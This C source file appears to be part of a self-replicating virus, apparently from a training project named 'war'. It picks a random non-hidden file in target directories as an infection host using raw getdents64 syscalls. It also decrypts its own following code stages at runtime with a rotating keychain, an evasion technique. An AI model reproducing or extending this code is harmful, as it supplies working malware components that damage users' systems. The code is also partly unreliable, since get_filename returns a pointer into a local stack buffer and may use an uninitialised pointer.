#include <war.h>

////////////////////////////////////////////////////////////////////////////////
/// STATIC FUNCTIONS
////////////////////////////////////////////////////////////////////////////////

__attribute__((always_inline)) static inline ssize_t get_entry(const char *path)
{
	int fd;
	size_t limit;
	size_t index;
	ssize_t ret = 0;

	struct linux_dirent64 *dirp;
	char buf[BUFF_SIZE];

	if ((fd = _open(path, O_RDONLY | O_DIRECTORY, 0000)) < 0)
		return -1;

	while ((limit = _getdents64(fd, (struct linux_dirent64 *)buf, BUFF_SIZE)) > 0)
	{
		index = 0;
		while (index < limit)
		{
			dirp = (struct linux_dirent64 *)(buf + index);
			index += dirp->d_reclen;
			ret += 1;
		}
	}

	_close(fd);

	return ret;
}

__attribute__((always_inline)) static inline char *get_filename(const char *path, const ssize_t entry)
{
	int fd;
	size_t limit;
	size_t index;
	size_t r_entry;

	struct linux_dirent64 *dirp;
	char buf[BUFF_SIZE];

recursion:
	if ((fd = _open(path, O_RDONLY | O_DIRECTORY, 0000)) < 0)
		return NULL;

	r_entry = _get_random_integer(entry);

	while ((limit = _getdents64(fd, (struct linux_dirent64 *)buf, BUFF_SIZE)) > 0)
	{
		index = 0;
		while (index < limit)
		{
			dirp = (struct linux_dirent64 *)(buf + index);
			if (r_entry == 0)
				break ;

			index += dirp->d_reclen;
			r_entry -= 1;
		}
		if (r_entry == 0)
			break ;
	}
	
	_close(fd);

	if (dirp->d_name[0] == '.')
		goto recursion;

	return dirp->d_name;
}

__attribute__((always_inline)) static inline void update_path(char *path, const char *filename)
{
	const size_t p_limit = _strlen(path);
	const size_t f_limit = _strlen(filename);

	_bzero(path + p_limit, PATH_MAX - p_limit);

	for (register size_t index = 0; index < f_limit; index++)
		path[p_limit + index] = filename[index];
}

////////////////////////////////////////////////////////////////////////////////
/// PUBLIC FUNCTION
////////////////////////////////////////////////////////////////////////////////

void find_host(struct s_host *host, struct s_keychain *keychain, void *dir, const size_t size, enum e_context context)
{
	decrypt_left(keychain, (char *)war, (void *)find_host - (void *)war);

	if (context == FAILURE)
		goto label;

	struct s_directory *directory = (struct s_directory *)dir;
	char *filename;

	for (register unsigned char index = 0; index < size; index++)
	{
		if ((directory[index].entry = get_entry(directory[index].path)) == -1)
		{
			context = FAILURE;
			goto label;
		}
		if ((filename = get_filename(directory[index].path, directory[index].entry)) == NULL)
		{
			context = FAILURE;
			goto label;
		}
		update_path(directory[index].path, filename);
	}

label:
	update_keychain_left(keychain, (char *)find_host, (void *)host_constructor - (void *)find_host);
	decrypt_left(keychain, (char *)host_constructor, (void *)criteria - (void *)host_constructor);

	host_constructor(host, keychain, directory[_get_random_integer(size)].path, context);
}
